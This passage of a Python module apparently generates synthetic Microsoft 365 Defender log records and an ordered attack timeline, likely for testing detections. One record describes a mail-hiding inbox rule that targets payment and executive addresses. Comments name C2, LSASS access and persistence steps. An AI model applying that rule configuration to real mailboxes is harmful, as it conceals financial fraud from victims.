        "AdditionalFields": json.dumps(
            {
                "AppliedConditionalAccessPolicies": ["ca-block-anonymizer"],
                "IsTorIPAddress": attacker["tor"],
                "AutonomousSystemNumber": 205100,
            }
        ),
        "_table": "EntraIdSignInEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# CloudAppEvents (1.12) — MDA
# ---------------------------------------------------------------------------


def cloud_app_events_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate a CloudAppEvents row (malicious inbox rule by default)."""
    profile = _resolve_profile(overrides)
    victim = profile["victim"]
    attacker = profile["attacker"]

    now = _utc_now()
    event: Dict[str, Any] = {
        "Timestamp": _iso_z(now),
        "ActionType": "New-InboxRule",
        "Application": "Microsoft Exchange Online",
        "ApplicationId": 11161,
        "AccountObjectId": victim["object_id"],
        "AccountId": victim["upn"],
        "AccountDisplayName": victim["display_name"],
        "AccountType": "Regular",
        "IsAdminOperation": False,
        "DeviceType": "",
        "OSPlatform": "Linux",
        "IPAddress": attacker["ip"],
        "IsAnonymousProxy": True,
        "CountryCode": attacker["country"],
        "City": "Bucharest",
        "ISP": "Tor Exit Node",
        "UserAgent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36",
        "ActivityType": "Account",
        "ActivityObjects": json.dumps(
            [
                {"Type": "Account", "Role": "Actor", "Name": victim["upn"]},
                {"Type": "Other", "Role": "Target", "Name": "InboxRule:HideReceiptsRule"},
            ]
        ),
        "ObjectName": "HideReceiptsRule",
        "ObjectType": "InboxRule",
        "ObjectId": "AAMkAGI0...AAA=",
        "ReportId": f"MDA-{now.strftime('%Y%m%d%H')}-{random.randint(100000, 999999)}",
        "AccountAdminInfo": None,
        "RawEventData": json.dumps(
            {
                "Parameters": [
                    {"Name": "Name", "Value": "HideReceiptsRule"},
                    {"Name": "From", "Value": "swift@,wire@,treasury@,cfo@"},
                    {"Name": "MoveToFolder", "Value": "RSS Subscriptions"},
                    {"Name": "MarkAsRead", "Value": "True"},
                    {"Name": "DeleteMessage", "Value": "False"},
                ],
                "ClientIP": attacker["ip"],
                "ResultStatus": "Succeeded",
            }
        ),
        "AdditionalFields": json.dumps({"AlertCorrelationId": "ec_2026-05-29_a17f9c"}),
        "_table": "CloudAppEvents",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# AlertInfo / AlertEvidence (1.13)
# ---------------------------------------------------------------------------


def alert_info_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Generate an AlertInfo row (one per Defender XDR alert)."""
    profile = _resolve_profile(overrides)
    mal = profile["malware"]

    now = _utc_now()
    event = {
        "Timestamp": _iso_z(now),
        "AlertId": (overrides or {}).get("AlertId") or str(uuid.uuid4()),
        "Title": f"Suspicious '{mal['threat_family']}' backdoor was prevented",
        "Category": "Execution",
        "Severity": "High",
        "ServiceSource": "Microsoft Defender for Endpoint",
        "DetectionSource": "Antivirus",
        "AttackTechniques": json.dumps(["T1059.001 - PowerShell", "T1027 - Obfuscated Files or Information"]),
        "_table": "AlertInfo",
    }
    return _apply_overrides(event, overrides)


# ---------------------------------------------------------------------------
# Back-compat shim — round-robin through telemetry tables
# ---------------------------------------------------------------------------

_TABLE_GENERATORS = [
    device_file_events_log,
    device_process_events_log,
    device_network_events_log,
    device_events_log,
    device_registry_events_log,
    device_logon_events_log,
    identity_logon_events_log,
    entra_id_signin_events_log,
    cloud_app_events_log,
]

_round_robin_idx = 0


def microsoft_365_defender_log(overrides: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
    """Back-compat shim: round-robins through the per-table generators."""
    global _round_robin_idx
    gen = _TABLE_GENERATORS[_round_robin_idx % len(_TABLE_GENERATORS)]
    _round_robin_idx += 1
    return gen(overrides)


# ---------------------------------------------------------------------------
# Convenience: build a full scenario timeline
# ---------------------------------------------------------------------------


def build_attack_timeline(
    base_time: Optional[datetime] = None,
    profile_overrides: Optional[Dict[str, Any]] = None,
) -> List[Dict[str, Any]]:
    """Build an ordered list of telemetry events that tell the EDR story.

    Offsets and phase ordering mirror the timestamps in
    microsoft_defender_telemetry_and_alerts.md (Sections 1.4 – 1.12).
    """
    base = base_time or _utc_now()
    prof_over = {"_profile": profile_overrides} if profile_overrides else None

    def _at(seconds: float) -> datetime:
        return base + timedelta(seconds=seconds)

    timeline: List[Dict[str, Any]] = []

    def _emit(fn, seconds: float, extra: Optional[Dict[str, Any]] = None):
        ov = dict(prof_over or {})
        if extra:
            ov.update(extra)
        ev = fn(ov)
        ev["Timestamp"] = _iso_z(_at(seconds))
        timeline.append(ev)

    # 1.4 DeviceFileEvents — ZIP then LNK (15s apart)
    _emit(device_file_events_log, 0.0)
    _emit(device_file_events_log, 15.0)
    # 1.5 DeviceProcessEvents — cmd → powershell
    _emit(device_process_events_log, 52.0)
    # 1.7 DeviceEvents — AMSI
    _emit(device_events_log, 52.4, {"ActionType": "AmsiScriptDetection"})
    # 1.6 DeviceNetworkEvents — C2 connection
    _emit(device_network_events_log, 53.2)
    # 1.7 DeviceEvents — AV detection
    _emit(device_events_log, 54.8, {"ActionType": "AntivirusDetection"})
    # 1.7 DeviceEvents — LsassAccess (rundll32 → lsass)
    _emit(device_events_log, 130.3, {"ActionType": "LsassAccess"})
    # 1.8 DeviceRegistryEvents — Run key persistence
    _emit(device_registry_events_log, 175.0)
    # 1.9 DeviceLogonEvents — failed RDP to DC
    _emit(device_logon_events_log, 307.0)
    # 1.10 IdentityLogonEvents — MDI Kerberos RC4 SPN
    _emit(identity_logon_events_log, 395.0)
    # 1.11 EntraIdSignInEvents — anonymizer sign-in
    _emit(entra_id_signin_events_log, 691.0)
    # 1.12 CloudAppEvents — malicious inbox rule
    _emit(cloud_app_events_log, 740.0)

    return timeline


__all__ = [
    "DEFAULT_PROFILE",
    "device_file_events_log",
    "device_process_events_log",
    "device_network_events_log",
    "device_events_log",
    "device_registry_events_log",
    "device_logon_events_log",
    "identity_logon_events_log",
    "entra_id_signin_events_log",
    "cloud_app_events_log",
    "alert_info_log",
    "microsoft_365_defender_log",
    "build_attack_timeline",
]


if __name__ == "__main__":
    print("Sample Microsoft 365 Defender Advanced Hunting events")
    print("=" * 60)
    for fn in _TABLE_GENERATORS:
        evt = fn()
        print(f"\n[{evt.get('_table')}]")
        print(json.dumps(evt, indent=2)[:400] + " ...")
